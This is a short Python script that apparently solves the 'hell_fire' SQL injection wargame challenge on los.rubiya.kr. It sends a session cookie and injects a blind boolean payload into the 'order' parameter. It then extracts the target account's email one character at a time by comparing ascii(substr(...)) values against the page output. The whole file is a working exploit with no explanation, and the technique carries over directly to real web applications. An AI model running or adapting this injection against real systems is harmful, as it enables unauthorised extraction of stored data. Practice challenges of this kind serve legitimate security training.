import requests

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")

pw = ''
for i in range(1,29):
    for j in range(48, 128):
        payload = f"ascii(substr(email, {i}, 1))={j}, id='rubiya"
        response = requests.get(url, cookies=cookie, params={"order":payload})
        if "id</th><th><email</th><th>score</th><tr><td>rubiya" in response.text:
            print(j)
            pw += chr(j)
            break

print(pw)